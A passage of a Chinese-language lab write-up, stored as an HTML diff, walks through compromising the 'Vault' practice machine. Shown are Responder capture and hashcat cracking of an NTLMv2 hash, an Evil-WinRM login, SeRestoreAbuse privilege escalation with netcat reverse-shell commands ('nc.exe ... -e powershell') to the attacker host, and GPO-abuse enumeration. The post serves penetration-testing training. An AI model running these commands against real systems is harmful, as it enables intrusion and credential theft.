+</span></span><span class="line"><span class="cl">Password <span class="k">for</span> <span class="o">[</span>WORKGROUP<span class="se">\]</span>:
+</span></span><span class="line"><span class="cl">Try <span class="s2">&#34;help&#34;</span> to get a list of possible commands.
+</span></span><span class="line"><span class="cl">smb: <span class="se">\&gt;</span> put test.lnk 
+</span></span><span class="line"><span class="cl">putting file test.lnk as <span class="se">\t</span>est.lnk <span class="o">(</span>3.3 kb/s<span class="o">)</span> <span class="o">(</span>average 3.3 kb/s<span class="o">)</span></span></span></code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">┌──<span class="o">(</span>xavier㉿kali<span class="o">)</span>-<span class="o">[</span>~/Desktop/OSCP/PG_Practice/Vault<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─$ sudo responder -I tun0
+</span></span><span class="line"><span class="cl">……
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Listening <span class="k">for</span> events...                                                                                 
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">[</span>SMB<span class="o">]</span> NTLMv2-SSP Client   : 192.168.202.172
+</span></span><span class="line"><span class="cl"><span class="o">[</span>SMB<span class="o">]</span> NTLMv2-SSP Username : VAULT<span class="se">\a</span>nirudh
+</span></span><span class="line"><span class="cl"><span class="o">[</span>SMB<span class="o">]</span> NTLMv2-SSP Hash     : anirudh::VAULT:b016c3bc0a2a9b1c:8B6874393AEA8CC736BEAA79E7E1D231:010100000000000000DD12A6A05BDA01B5B2F11259155F4A000000000200080051004B003700350001001E00570049004E002D00570041005A00460036004B0035004A0057004B00560004003400570049004E002D00570041005A00460036004B0035004A0057004B0056002E0051004B00370035002E004C004F00430041004C000300140051004B00370035002E004C004F00430041004C000500140051004B00370035002E004C004F00430041004C000700080000DD12A6A05BDA010600040002000000080030003000000000000000010000000020000077EEB54469D1F6103BA0F72DC177ACE44970D6FADE091CA17405179482A7C5F20A001000000000000000000000000000000000000900260063006900660073002F003100390032002E003100360038002E00340035002E003200340038000000000000000000                       
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Skipping previously captured <span class="nb">hash</span> <span class="k">for</span> VAULT<span class="se">\a</span>nirudh
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Skipping previously captured <span class="nb">hash</span> <span class="k">for</span> VAULT<span class="se">\a</span>nirudh</span></span></code></pre></td></tr></table>
+</div>
+</div><p>hashcat尝试破解</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">┌──<span class="o">(</span>xavier㉿kali<span class="o">)</span>-<span class="o">[</span>~/Desktop/OSCP/PG_Practice/Vault<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─$ hashcat -m <span class="m">5600</span> -a <span class="m">0</span> 1.hash /usr/share/wordlists/rockyou.txt --force --quiet
+</span></span><span class="line"><span class="cl">ANIRUDH::VAULT:b016c3bc0a2a9b1c:8b6874393aea8cc736beaa79e7e1d231:010100000000000000dd12a6a05bda01b5b2f11259155f4a000000000200080051004b003700350001001e00570049004e002d00570041005a00460036004b0035004a0057004b00560004003400570049004e002d00570041005a00460036004b0035004a0057004b0056002e0051004b00370035002e004c004f00430041004c000300140051004b00370035002e004c004f00430041004c000500140051004b00370035002e004c004f00430041004c000700080000dd12a6a05bda010600040002000000080030003000000000000000010000000020000077eeb54469d1f6103ba0f72dc177ace44970d6fade091ca17405179482a7c5f20a001000000000000000000000000000000000000900260063006900660073002f003100390032002e003100360038002e00340035002e003200340038000000000000000000:SecureHM</span></span></code></pre></td></tr></table>
+</div>
+</div><p>得到一组账号密码：<code>anirudh/SecureHM</code></p>
+<p>使用Evil-WinRM成功登录系统</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">┌──<span class="o">(</span>xavier㉿kali<span class="o">)</span>-<span class="o">[</span>~/Desktop/OSCP/PG_Practice/Vault<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─$ evil-winrm -u anirudh -p SecureHM -i 192.168.202.172
+</span></span><span class="line"><span class="cl">……
+</span></span><span class="line"><span class="cl">*Evil-WinRM* PS C:<span class="se">\U</span>sers<span class="se">\a</span>nirudh<span class="se">\D</span>ocuments&gt;
+</span></span><span class="line"><span class="cl">*Evil-WinRM* PS C:<span class="se">\U</span>sers<span class="se">\a</span>nirudh<span class="se">\D</span>ocuments&gt; <span class="nb">type</span> C:<span class="se">\U</span>sers<span class="se">\a</span>nirudh<span class="se">\D</span>esktop<span class="se">\l</span>ocal.txt
+</span></span><span class="line"><span class="cl">6379a394e97f465833bd2a2d72fe5d56</span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="prive" class="heading-element"><span>PrivE</span>
+  <a href="#prive" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><p>检查当前用户权限，发现权限有很多：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">*Evil-WinRM* PS C:<span class="se">\U</span>sers<span class="se">\a</span>nirudh<span class="se">\D</span>ocuments&gt; whoami /priv
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">PRIVILEGES INFORMATION
+</span></span><span class="line"><span class="cl">----------------------
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Privilege Name                Description                         <span class="nv">State</span>
+</span></span><span class="line"><span class="cl"><span class="o">=============================</span> <span class="o">===================================</span> <span class="o">=======</span>
+</span></span><span class="line"><span class="cl">SeMachineAccountPrivilege     Add workstations to domain          Enabled
+</span></span><span class="line"><span class="cl">SeSystemtimePrivilege         Change the system <span class="nb">time</span>              Enabled
+</span></span><span class="line"><span class="cl">SeBackupPrivilege             Back up files and directories       Enabled
+</span></span><span class="line"><span class="cl">SeRestorePrivilege            Restore files and directories       Enabled
+</span></span><span class="line"><span class="cl">SeShutdownPrivilege           Shut down the system                Enabled
+</span></span><span class="line"><span class="cl">SeChangeNotifyPrivilege       Bypass traverse checking            Enabled
+</span></span><span class="line"><span class="cl">SeRemoteShutdownPrivilege     Force shutdown from a remote system Enabled
+</span></span><span class="line"><span class="cl">SeIncreaseWorkingSetPrivilege Increase a process working <span class="nb">set</span>      Enabled
+</span></span><span class="line"><span class="cl">SeTimeZonePrivilege           Change the <span class="nb">time</span> zone                Enabled</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="serestoreprivilege" class="heading-element"><span>SeRestorePrivilege</span>
+  <a href="#serestoreprivilege" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><p>看到有这个权限，可以用于提权。</p>
+<p>使用工具：<a href="https://github.com/xct/SeRestoreAbuse"target="_blank" rel="external nofollow noopener noreferrer">SeRestoreAbuse</a>，需要自己手动编译一下。</p>
+<p>上传SeRestoreAbuse 和nc</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">*Evil-WinRM* PS C:<span class="se">\U</span>sers<span class="se">\a</span>nirudh<span class="se">\D</span>ocuments&gt; upload SeRestoreAbuse.exe
+</span></span><span class="line"><span class="cl">*Evil-WinRM* PS C:<span class="se">\U</span>sers<span class="se">\a</span>nirudh<span class="se">\D</span>ocuments&gt; upload nc64.exe
+</span></span><span class="line"><span class="cl">*Evil-WinRM* PS C:<span class="se">\U</span>sers<span class="se">\a</span>nirudh<span class="se">\D</span>ocuments&gt; mkdir C:<span class="se">\t</span>mp<span class="se">\
+</span></span></span><span class="line"><span class="cl"><span class="se"></span>*Evil-WinRM* PS C:<span class="se">\U</span>sers<span class="se">\a</span>nirudh<span class="se">\D</span>ocuments&gt; copy nc64.exe C:<span class="se">\t</span>mp<span class="se">\n</span>c.exe</span></span></code></pre></td></tr></table>
+</div>
+</div><p>执行 SeRestoreAbuse 利用脚本</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">*Evil-WinRM* PS C:<span class="se">\U</span>sers<span class="se">\a</span>nirudh<span class="se">\D</span>ocuments&gt; ./SeRestoreAbuse.exe <span class="s2">&#34;C:\tmp\nc.exe 192.168.45.248 4444 -e powershell&#34;</span>
+</span></span><span class="line"><span class="cl">RegCreateKeyExA result: <span class="m">0</span>
+</span></span><span class="line"><span class="cl">RegSetValueExA result: <span class="m">0</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>另一边nc监听，因为SeRestoreAbuse这个工具执行一段时间后，可能会报错导致shell中断，再做一次转发就好了</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span><span class="lnt">9
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">┌──<span class="o">(</span>xavier㉿kali<span class="o">)</span>-<span class="o">[</span>~/Desktop/OSCP/PG_Practice/Vault<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─$ nc -nlvp <span class="m">4444</span>
+</span></span><span class="line"><span class="cl">listening on <span class="o">[</span>any<span class="o">]</span> <span class="m">4444</span> ...
+</span></span><span class="line"><span class="cl">connect to <span class="o">[</span>192.168.45.248<span class="o">]</span> from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>192.168.202.172<span class="o">]</span> <span class="m">51849</span>
+</span></span><span class="line"><span class="cl">Windows PowerShell 
+</span></span><span class="line"><span class="cl">Copyright <span class="o">(</span>C<span class="o">)</span> Microsoft Corporation. All rights reserved.
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">PS C:<span class="se">\W</span>indows<span class="se">\s</span>ystem32&gt; C:<span class="se">\t</span>mp<span class="se">\n</span>c.exe 192.168.45.248 <span class="m">5555</span> -e powershell
+</span></span><span class="line"><span class="cl">C:<span class="se">\t</span>mp<span class="se">\n</span>c.exe 192.168.45.248 <span class="m">5555</span> -e powershell</span></span></code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">┌──<span class="o">(</span>xavier㉿kali<span class="o">)</span>-<span class="o">[</span>~/Desktop/OSCP/PG_Practice/Vault<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─$ nc -nlvp <span class="m">5555</span>
+</span></span><span class="line"><span class="cl">listening on <span class="o">[</span>any<span class="o">]</span> <span class="m">5555</span> ...
+</span></span><span class="line"><span class="cl">connect to <span class="o">[</span>192.168.45.248<span class="o">]</span> from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>192.168.202.172<span class="o">]</span> <span class="m">51852</span>
+</span></span><span class="line"><span class="cl">Windows PowerShell 
+</span></span><span class="line"><span class="cl">Copyright <span class="o">(</span>C<span class="o">)</span> Microsoft Corporation. All rights reserved.
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">PS C:<span class="se">\W</span>indows<span class="se">\s</span>ystem32&gt; whoami
+</span></span><span class="line"><span class="cl">whoami
+</span></span><span class="line"><span class="cl">nt authority<span class="se">\s</span>ystem
+</span></span><span class="line"><span class="cl">PS C:<span class="se">\W</span>indows<span class="se">\s</span>ystem32&gt; <span class="nb">type</span> C:<span class="se">\u</span>sers<span class="se">\a</span>dministrator<span class="se">\d</span>esktop<span class="se">\p</span>roof.txt
+</span></span><span class="line"><span class="cl"><span class="nb">type</span> C:<span class="se">\u</span>sers<span class="se">\a</span>dministrator<span class="se">\d</span>esktop<span class="se">\p</span>roof.txt
+</span></span><span class="line"><span class="cl">12ef329cf77b22fb67e52b389022be6d</span></span></code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">./SeRestoreAbuse.exe <span class="s2">&#34;C:\tmp\nc.exe 192.168.45.248 4444 -e powershell&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">C:<span class="se">\t</span>mp<span class="se">\n</span>c.exe 192.168.45.248 <span class="m">5555</span> -e powershell</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="gpo-abuse" class="heading-element"><span>GPO Abuse</span>
+  <a href="#gpo-abuse" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><p>检查当前用户是否具备修改组策略的权限。</p>
+<p>将PowerView 放到Evil-WinRM的执行目录下</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">┌──<span class="o">(</span>xavier㉿kali<span class="o">)</span>-<span class="o">[</span>~/Desktop/OSCP/PG_Practice/Vault<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─$ cp /usr/share/windows-resources/powersploit/Recon/PowerView.ps1 .
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">┌──<span class="o">(</span>xavier㉿kali<span class="o">)</span>-<span class="o">[</span>~/Desktop/OSCP/PG_Practice/Vault<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─$ ls
+</span></span><span class="line"><span class="cl">1.hash  PowerView.ps1</span></span></code></pre></td></tr></table>
+</div>
+</div><p>接下来, 使用Evil-WinRM 和 -s 参数重新连接，以便访问当前目录中的 PowerShell 脚本。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">*Evil-WinRM* PS C:\Users\anirudh\Documents&gt; exit
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Info: Exiting with code 0
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">┌──(xavier㉿kali)-[~/Desktop/OSCP/PG_Practice/Vault]
+</span></span><span class="line"><span class="cl">└─$ evil-winrm -u anirudh -p SecureHM -i 192.168.202.172 -s .
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">……
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">*Evil-WinRM* PS C:\Users\anirudh\Documents&gt; 
+</span></span><span class="line"><span class="cl">*Evil-WinRM* PS C:\Users\anirudh\Documents&gt; PowerView.ps1</span></span></code></pre></td></tr></table>
+</div>
+</div><p>组策略枚举</p>
+<p>使用  <code>Get-NetGPO</code> 列出 GPOs（Group Policy Objects），获取GUID</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">*Evil-WinRM* PS C:\Users\anirudh\Documents&gt; PowerView.ps1
+</span></span><span class="line"><span class="cl">*Evil-WinRM* PS C:\Users\anirudh\Documents&gt; Get-NetGPO
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">usncreated               : 5672
+</span></span><span class="line"><span class="cl">systemflags              : -1946157056
+</span></span><span class="line"><span class="cl">displayname              : Default Domain Policy
+</span></span><span class="line"><span class="cl">gpcmachineextensionnames : [{35378EAC-683F-11D2-A89A-00C04FBBCFA2}{53D6AB1B-2488-11D1-A28C-00C04FB94F17}][{827D319E-6EAC-11D2-A4EA-00C04F79F83A}{803E14A0-B4FB-11D0-A0D0-00A0C90F574B}][{B1BE8D72-6EAC-11D2-A4EA-00C04F79F83A}{53D6AB1B-2488-11D1-A28C-00
+</span></span><span class="line"><span class="cl">                           C04FB94F17}]
+</span></span><span class="line"><span class="cl">whenchanged              : 11/19/2021 9:00:32 AM
+</span></span><span class="line"><span class="cl">objectclass              : {top, container, groupPolicyContainer}
+</span></span><span class="line"><span class="cl">gpcfunctionalityversion  : 2
+</span></span><span class="line"><span class="cl">showinadvancedviewonly   : True
+</span></span><span class="line"><span class="cl">usnchanged               : 12778
+</span></span><span class="line"><span class="cl">dscorepropagationdata    : {11/19/2021 9:00:32 AM, 11/19/2021 8:51:14 AM, 1/1/1601 12:00:00 AM}
+</span></span><span class="line"><span class="cl">name                     : {31B2F340-016D-11D2-945F-00C04FB984F9}
+</span></span><span class="line"><span class="cl">flags                    : 0
+</span></span><span class="line"><span class="cl">cn                       : {31B2F340-016D-11D2-945F-00C04FB984F9}
+</span></span><span class="line"><span class="cl">iscriticalsystemobject   : True
+</span></span><span class="line"><span class="cl">gpcfilesyspath           : \\vault.offsec\sysvol\vault.offsec\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}
+</span></span><span class="line"><span class="cl">distinguishedname        : CN={31B2F340-016D-11D2-945F-00C04FB984F9},CN=Policies,CN=System,DC=vault,DC=offsec
+</span></span><span class="line"><span class="cl">whencreated              : 11/19/2021 8:50:33 AM
+</span></span><span class="line"><span class="cl">versionnumber            : 4
+</span></span><span class="line"><span class="cl">instancetype             : 4
+</span></span><span class="line"><span class="cl">objectguid               : 93130581-3375-49c7-88d3-afdc915a9526
+</span></span><span class="line"><span class="cl">objectcategory           : CN=Group-Policy-Container,CN=Schema,CN=Configuration,DC=vault,DC=offsec
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">usncreated               : 5675
+</span></span><span class="line"><span class="cl">systemflags              : -1946157056
+</span></span><span class="line"><span class="cl">displayname              : Default Domain Controllers Policy
+</span></span><span class="line"><span class="cl">gpcmachineextensionnames : [{827D319E-6EAC-11D2-A4EA-00C04F79F83A}{803E14A0-B4FB-11D0-A0D0-00A0C90F574B}]
+</span></span><span class="line"><span class="cl">whenchanged              : 11/19/2021 8:50:33 AM
+</span></span><span class="line"><span class="cl">objectclass              : {top, container, groupPolicyContainer}
+</span></span><span class="line"><span class="cl">gpcfunctionalityversion  : 2
+</span></span><span class="line"><span class="cl">showinadvancedviewonly   : True
+</span></span><span class="line"><span class="cl">usnchanged               : 5675
+</span></span><span class="line"><span class="cl">dscorepropagationdata    : {11/19/2021 8:51:14 AM, 1/1/1601 12:00:00 AM}
+</span></span><span class="line"><span class="cl">name                     : {6AC1786C-016F-11D2-945F-00C04fB984F9}
+</span></span><span class="line"><span class="cl">flags                    : 0
+</span></span><span class="line"><span class="cl">cn                       : {6AC1786C-016F-11D2-945F-00C04fB984F9}
+</span></span><span class="line"><span class="cl">iscriticalsystemobject   : True
+</span></span><span class="line"><span class="cl">gpcfilesyspath           : \\vault.offsec\sysvol\vault.offsec\Policies\{6AC1786C-016F-11D2-945F-00C04fB984F9}
+</span></span><span class="line"><span class="cl">distinguishedname        : CN={6AC1786C-016F-11D2-945F-00C04fB984F9},CN=Policies,CN=System,DC=vault,DC=offsec
+</span></span><span class="line"><span class="cl">whencreated              : 11/19/2021 8:50:33 AM
+</span></span><span class="line"><span class="cl">versionnumber            : 1
+</span></span><span class="line"><span class="cl">instancetype             : 4
+</span></span><span class="line"><span class="cl">objectguid               : 0ccc30ba-3bef-43ac-9c61-ebb814e9a685
+</span></span><span class="line"><span class="cl">objectcategory           : CN=Group-Policy-Container,CN=Schema,CN=Configuration,DC=vault,DC=offsec</span></span></code></pre></td></tr></table>
+</div>
+</div><p>使用 Get-GPPermission 检查默认组策略（Default Group Policy）的权限。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">*Evil-WinRM* PS C:\Users\anirudh\Documents&gt; Get-GPPermission -Guid 31B2F340-016D-11D2-945F-00C04FB984F9 -TargetType User -TargetName anirudh
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Trustee     : anirudh
+</span></span><span class="line"><span class="cl">TrusteeType : User
+</span></span><span class="line"><span class="cl">Permission  : GpoEditDeleteModifySecurity
+</span></span><span class="line"><span class="cl">Inherited   : False</span></span></code></pre></td></tr></table>
+</div>
+</div><p>“Permission”表明 anirudh 用户编辑、删除和修改此策略的权限。可以使用 <a href="https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.0_x64/SharpGPOAbuse.exe"target="_blank" rel="external nofollow noopener noreferrer">SharpGPOAbuse</a> 工具来利用这种错误配置。</p>
+<p>下载SharpGPOAbuse: <a href="https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.0_x64/SharpGPOAbuse.exe"target="_blank" rel="external nofollow noopener noreferrer">https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.0_x64/SharpGPOAbuse.exe</a></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">┌──<span class="o">(</span>xavier㉿kali<span class="o">)</span>-<span class="o">[</span>~/Desktop/OSCP/tools/win<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─$ wget https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.0_x64/SharpGPOAbuse.exe</span></span></code></pre></td></tr></table>
+</div>
+</div><p>上传到目标主机</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
